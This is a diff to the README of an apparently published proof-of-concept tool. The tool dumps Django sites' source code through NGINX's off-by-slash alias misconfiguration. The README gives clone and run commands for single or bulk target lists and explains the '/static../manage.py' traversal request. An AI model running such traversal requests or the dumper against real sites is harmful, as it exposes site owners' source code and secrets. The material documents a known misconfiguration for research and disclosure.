@@ -7,7 +7,9 @@ A proof of concept to dump Django website's source code affected by NGINX's off-
 
 ```bash
 $ git clone https://github.com/adamyordan/offbyslash-django-dumper
+
 $ cd offbyslash-django-dumper
+
 $ pip install -r requirements.txt
 ```
 
@@ -15,7 +17,7 @@ $ pip install -r requirements.txt
 ## Usage
 Pass target url as argument
 ```bash
-$ python main.py --url http://django-site.com/
+$ python exploit.py --url http://django-site.com/
 ```
 
 Or using files containing multiple target urls
@@ -25,7 +27,7 @@ http://django-site.com/
 https://other-affected-site.org/
 http://cool-website.me/
 
-$ python main.py --file targets.txt
+$ python exploit.py --file targets.txt
 ```
 
 The result is available at `dump` directory
@@ -68,7 +70,7 @@ location /static {
 }
 ```
 
-By sending a request to `http://affected-site.com/static../manage.py`, Nginx matches the rule and appends the remainder 
+By sending a request to `http://django-site.com/static../manage.py`, Nginx matches the rule and appends the remainder 
 to destination `/home/app/static/../manage.py`. Therefore serving the `manage.py` as static file.
 
 
